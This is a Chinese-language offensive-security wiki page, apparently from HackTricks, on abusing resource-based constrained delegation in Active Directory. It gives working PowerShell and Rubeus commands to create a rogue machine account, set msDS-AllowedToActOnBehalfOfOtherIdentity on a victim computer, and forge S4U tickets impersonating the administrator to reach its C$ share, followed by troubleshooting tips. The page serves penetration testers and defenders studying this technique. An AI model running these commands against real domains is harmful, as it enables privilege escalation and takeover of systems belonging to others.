# 基于资源的受限委派

{{#include ../../banners/hacktricks-training.md}}

## 基于资源的受限委派基础

这与基本的 [Constrained Delegation](constrained-delegation.md) 类似，但**不是**给一个**对象**权限以**代表任何用户对服务进行 impersonate**。基于资源的受限委派**设置**在**对象中谁能够对其 impersonate 任何用户**。

在这种情况下，受限对象将具有一个名为 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ 的属性，包含可以对其 impersonate 任何其他用户的用户的名称。

与其他委派的另一个重要区别是，任何具有**计算机账户的写权限**（_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_）的用户都可以设置 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_（在其他形式的委派中，您需要域管理员权限）。

### 新概念

在受限委派中提到，用户的 _userAccountControl_ 值中的 **`TrustedToAuthForDelegation`** 标志是执行 **S4U2Self** 所需的。但这并不完全正确。\
实际上，即使没有该值，如果您是一个**服务**（具有 SPN），您也可以对任何用户执行 **S4U2Self**，但是，如果您**具有 `TrustedToAuthForDelegation`**，返回的 TGS 将是**可转发的**，而如果您**没有**该标志，返回的 TGS **将不会**是**可转发的**。

然而，如果在 **S4U2Proxy** 中使用的 **TGS** **不是可转发的**，尝试利用**基本的受限委派**将**不起作用**。但如果您尝试利用**基于资源的受限委派，它将有效**（这不是一个漏洞，显然是一个特性）。

### 攻击结构

> 如果您对**计算机**账户具有**写等效权限**，您可以在该机器上获得**特权访问**。

假设攻击者已经对受害计算机具有**写等效权限**。

1. 攻击者**破坏**一个具有**SPN**的账户或**创建一个**（“服务 A”）。请注意，**任何**_管理员用户_在没有其他特殊权限的情况下可以**创建**最多 10 个**计算机对象（**_**MachineAccountQuota**_**）并为其设置一个**SPN**。因此，攻击者可以创建一个计算机对象并设置一个 SPN。
2. 攻击者**利用其对受害计算机的写权限**（ServiceB）配置**基于资源的受限委派，以允许 ServiceA 对该受害计算机（ServiceB）进行 impersonate 任何用户**。
3. 攻击者使用 Rubeus 执行**完整的 S4U 攻击**（S4U2Self 和 S4U2Proxy），从服务 A 到服务 B，针对**具有对服务 B 的特权访问的用户**。
   1. S4U2Self（来自被破坏/创建的 SPN 账户）：请求**管理员的 TGS 给我**（不可转发）。
   2. S4U2Proxy：使用前一步的**不可转发 TGS**请求**管理员**到**受害主机**的**TGS**。
   3. 即使您使用的是不可转发的 TGS，由于您正在利用基于资源的受限委派，它将有效。
   4. 攻击者可以**传票**并**冒充**用户以获得对**受害 ServiceB**的**访问**。

要检查域的 _**MachineAccountQuota**_，您可以使用：
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻击

### 创建计算机对象

您可以使用 [powermad](https://github.com/Kevin-Robertson/Powermad) 在域内创建计算机对象**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### 配置基于资源的受限委派

**使用 activedirectory PowerShell 模块**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**使用 powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 执行完整的 S4U 攻击

首先，我们创建了新的计算机对象，密码为 `123456`，因此我们需要该密码的哈希值：
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
这将打印该账户的 RC4 和 AES 哈希。\
现在，可以执行攻击：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
您只需使用 Rubeus 的 `/altservice` 参数询问一次即可生成更多票证：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> 注意，用户有一个属性叫做“**无法被委托**”。如果用户的此属性为 True，您将无法冒充他。此属性可以在 bloodhound 中查看。

### 访问

最后一条命令将执行 **完整的 S4U 攻击，并将 TGS** 从 Administrator 注入到受害主机的 **内存** 中。\
在此示例中，请求了 Administrator 的 **CIFS** 服务的 TGS，因此您将能够访问 **C$**：
```bash
ls \\victim.domain.local\C$
```
### 滥用不同的服务票证

了解[**可用的服务票证在这里**](silver-ticket.md#available-services)。

## Kerberos 错误

- **`KDC_ERR_ETYPE_NOTSUPP`**：这意味着 kerberos 配置为不使用 DES 或 RC4，而您仅提供了 RC4 哈希。至少向 Rubeus 提供 AES256 哈希（或同时提供 rc4、aes128 和 aes256 哈希）。示例：`[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**：这意味着当前计算机的时间与 DC 的时间不同，kerberos 无法正常工作。
- **`preauth_failed`**：这意味着给定的用户名 + 哈希无法登录。您可能忘记在生成哈希时在用户名中放入“$”（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）
- **`KDC_ERR_BADOPTION`**：这可能意味着：
  - 您尝试模拟的用户无法访问所需的服务（因为您无法模拟它或因为它没有足够的权限）
  - 请求的服务不存在（如果您请求 winrm 的票证但 winrm 没有运行）
  - 创建的 fakecomputer 已失去对易受攻击服务器的权限，您需要将其恢复。

## 参考文献

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

{{#include ../../banners/hacktricks-training.md}}
